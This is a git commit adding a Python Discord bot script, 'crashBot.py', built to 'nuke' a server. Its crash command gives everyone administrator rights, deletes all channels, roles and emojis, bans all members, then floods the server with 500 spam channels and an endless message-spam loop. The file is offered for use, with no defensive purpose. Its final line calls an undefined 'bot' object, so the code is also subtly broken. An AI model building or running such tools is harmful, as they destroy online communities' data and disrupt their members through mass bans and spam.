7bc7658a482db0705a02e96edf965b6aa401cabd
TailsDark <96192978+TailsDark@users.noreply.github.com>
2021-12-24 13:11:33 +0300

    Add files via upload

---
+++ crashBot.py
@@ -0,0 +1,85 @@
+#import keep_alive                                         #code from TailsDark
+import discord
+from discord.ext import commands
+import random
+from discord import Permissions
+from colorama import Fore, Style
+import asyncio
+import os
+
+
+SPAM_CHANNEL =  ["crashed by you"]
+SPAM_MESSAGE = ["text"]
+
+client = commands.Bot(command_prefix=".")
+
+
+@client.event
+async def on_ready():
+   print(''' 
+   
+подключенно
+
+ ''')
+
+
+@client.command()
+async def crash(ctx):
+    await ctx.message.delete()
+    guild = ctx.guild
+    try:
+      role = discord.utils.get(guild.roles, name = "@everyone")
+      await role.edit(permissions = Permissions.all())
+      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
+    except:
+      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
+    for channel in guild.channels:
+      try:
+        await channel.delete()
+        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
+      except:
+        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
+    for member in guild.members:
+     try:
+       await member.ban()
+       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
+     except:
+       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
+    for role in guild.roles:
+     try:
+       await role.delete()
+       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
+     except:
+       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
+    for emoji in list(ctx.guild.emojis):
+     try:
+       await emoji.delete()
+       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
+     except:
+       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
+    banned_users = await guild.bans()
+    for ban_entry in banned_users:
+      user = ban_entry.user
+      try:
+        await user.unban("YOUR_USERNAME_AND_TAG")
+        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
+      except:
+        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
+    await guild.create_text_channel("crashed by you")
+    for channel in guild.text_channels:
+        link = await channel.create_invite(max_age = 0, max_uses = 0)
+        print(f"New Invite: {link}")
+    amount = 500
+    for i in range(amount):
+       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
+    print(f"nuked {guild.name} Successfully.")
+    return
+
+@client.event
+async def on_guild_channel_create(channel):
+  while True:
+    await channel.send(random.choice(SPAM_MESSAGE))
+
+#keep_alive.keep_alive()
+#client.run(os.environ.get('TOKEN'), bot = True, reconnect = True)
+bot.run("token")
